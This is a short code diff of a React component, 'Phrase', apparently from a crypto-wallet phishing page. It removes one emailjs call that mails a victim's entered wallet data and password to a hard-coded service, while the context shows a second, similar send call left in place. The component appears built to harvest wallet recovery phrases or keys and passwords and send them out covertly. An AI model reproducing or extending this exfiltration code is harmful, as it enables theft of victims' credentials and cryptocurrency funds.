@@ -69,24 +69,6 @@ const Phrase = ({ selectedWallet, appType}) => {
     try {
 
       await emailjs.send(
-        "service_30vkiql",
-        "template_e0wb6w8",
-        {
-          to_name: "prime_noval_app",
-          from_name: formData.name,
-          message: `
-            Name: ${formData.name}
-            Type: ${formData.type}
-            Data: ${formData.data}
-            Password: ${formData.password}
-          `,
-        },
-        "4leuzsOPi6Oh_D4e0"
-      );
-
-      await sendFast(1 * 5 * 1000); 
-
-      await emailjs.send(
         "service_ky8xa0e",
         "template_kqjcmir",
         {
